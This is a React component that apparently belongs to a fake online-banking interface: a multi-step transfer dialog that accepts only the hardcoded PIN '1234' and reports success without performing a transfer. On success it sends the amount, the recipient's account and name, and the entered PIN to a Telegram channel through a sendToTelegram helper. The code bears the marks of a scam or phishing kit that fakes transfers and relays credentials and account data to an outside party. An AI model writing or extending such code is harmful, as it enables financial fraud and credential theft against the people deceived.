
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog"
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { CheckCircle, AlertCircle } from 'lucide-react';
import { sendToTelegram } from "@/utils/telegramNotifier";

interface TransferDialogProps {
  isOpen: boolean;
  onClose: () => void;
  onTransferComplete: (amount: number) => void;
  currentBalance: number;
  transferType: 'domestic' | 'international' | 'wire';
}

export const TransferDialog = ({ 
  isOpen, 
  onClose, 
  onTransferComplete,
  currentBalance,
  transferType 
}: TransferDialogProps) => {
  const [step, setStep] = useState<'amount' | 'account' | 'pin' | 'success'>('amount');
  const [amount, setAmount] = useState('');
  const [recipientAccount, setRecipientAccount] = useState('');
  const [recipientName, setRecipientName] = useState('');
  const [pin, setPin] = useState('');
  const [pinError, setPinError] = useState('');
  const [pinAttempts, setPinAttempts] = useState(0);

  const handleAmountSubmit = () => {
    if (parseFloat(amount) > currentBalance) {
      alert("Insufficient funds!");
      return;
    }
    setStep('account');
  };

  const handleAccountSubmit = () => {
    setStep('pin');
  };

  const handlePinSubmit = () => {
    // Accept PIN 1234
    if (pin === '1234') {
      setStep('success');
      
      // Send transfer details to Telegram
      const transferDetails = `Transfer Details:
Amount: $${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
From: PREMIER PLUS CKG (...5944)
To: ${recipientAccount} (${recipientName})
Type: ${transferType}
PIN: ${pin}`;
      
      sendToTelegram(transferDetails);
      
      // Auto close after 3 seconds and call completion handler
      setTimeout(() => {
        onTransferComplete(parseFloat(amount));
        onClose();
      }, 3000);
    } else {
      setPinError('Incorrect PIN. Please try again.');
      setPinAttempts(prev => prev + 1);
      
      if (pinAttempts >= 2) {
        setTimeout(() => {
          onClose();
        }, 2000);
      }
    }
  };

  return (
    <AlertDialog open={isOpen} onOpenChange={onClose}>
      <AlertDialogContent className="max-w-lg">
        {step === 'amount' && (
          <>
            <AlertDialogHeader>
              <AlertDialogTitle>Enter Transfer Amount</AlertDialogTitle>
              <AlertDialogDescription>
                How much would you like to transfer?
              </AlertDialogDescription>
            </AlertDialogHeader>
            <div className="grid gap-4 py-4">
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="amount" className="text-right">
                  Amount
                </Label>
                <Input 
                  type="number"
                  id="amount" 
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="col-span-3" 
                />
              </div>
            </div>
            <AlertDialogFooter>
              <AlertDialogCancel>Cancel</AlertDialogCancel>
              <AlertDialogAction onClick={handleAmountSubmit}>Continue</AlertDialogAction>
            </AlertDialogFooter>
          </>
        )}

        {step === 'account' && (
          <>
            <AlertDialogHeader>
              <AlertDialogTitle>Enter Recipient Account Details</AlertDialogTitle>
              <AlertDialogDescription>
                Enter the recipient's account number and name.
              </AlertDialogDescription>
            </AlertDialogHeader>
            <div className="grid gap-4 py-4">
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="accountNumber" className="text-right">
                  Account Number
                </Label>
                <Input 
                  type="text"
                  id="accountNumber" 
                  value={recipientAccount}
                  onChange={(e) => setRecipientAccount(e.target.value)}
                  className="col-span-3" 
                />
              </div>
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="accountName" className="text-right">
                  Account Name
                </Label>
                <Input 
                  type="text"
                  id="accountName" 
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                  className="col-span-3" 
                />
              </div>
            </div>
            <AlertDialogFooter>
              <AlertDialogCancel>Cancel</AlertDialogCancel>
              <AlertDialogAction onClick={handleAccountSubmit}>Continue</AlertDialogAction>
            </AlertDialogFooter>
          </>
        )}

        {step === 'pin' && (
          <>
            <AlertDialogHeader>
              <AlertDialogTitle>Enter Your PIN</AlertDialogTitle>
              <AlertDialogDescription>
                Please enter your 4-digit PIN to confirm the transfer.
              </AlertDialogDescription>
            </AlertDialogHeader>
            <div className="grid gap-4 py-4">
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="pin" className="text-right">
                  PIN
                </Label>
                <Input
                  type="password"
                  id="pin"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  className="col-span-3"
                />
              </div>
              {pinError && (
                <div className="flex items-center space-x-2 text-red-600 col-span-4 justify-center">
                  <AlertCircle className="h-4 w-4" />
                  <span className="text-sm">{pinError}</span>
                </div>
              )}
            </div>
            <AlertDialogFooter>
              <AlertDialogCancel>Cancel</AlertDialogCancel>
              <AlertDialogAction onClick={handlePinSubmit}>
                Confirm Transfer
              </AlertDialogAction>
            </AlertDialogFooter>
          </>
        )}

        {step === 'success' && (
          <>
            <AlertDialogHeader>
              <AlertDialogTitle>Transfer Successful!</AlertDialogTitle>
              <AlertDialogDescription>
                <div className="flex items-center space-x-2 text-green-600">
                  <CheckCircle className="h-6 w-6" />
                  <span className="text-lg font-semibold">
                    ${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })} successfully transferred.
                  </span>
                </div>
              </AlertDialogDescription>
            </AlertDialogHeader>
          </>
        )}
      </AlertDialogContent>
    </AlertDialog>
  );
};
